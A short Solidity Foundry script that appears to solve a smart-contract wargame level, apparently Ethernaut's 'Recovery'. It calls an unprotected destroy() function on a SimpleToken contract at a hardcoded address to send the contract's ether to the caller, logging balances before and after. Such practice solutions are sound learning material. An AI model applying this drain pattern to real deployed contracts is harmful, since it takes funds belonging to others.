// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";

interface SimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryScript is Script {
    function run() external {
        console.log("before balance of " , msg.sender , " is : " , msg.sender.balance);
        vm.startBroadcast();
        // 1. from `instance` address , we can get the SimpleToken contract's address
        address simpleTokenAddress = 0x0cF5d54B719E6d21027bD4E429C8b6a7cBa4D8c6;
        SimpleToken st = SimpleToken(simpleTokenAddress);
        st.destroy(payable(msg.sender));
        vm.stopBroadcast();
        console.log("after balance of " , msg.sender , " is : " , msg.sender.balance);
    }
}
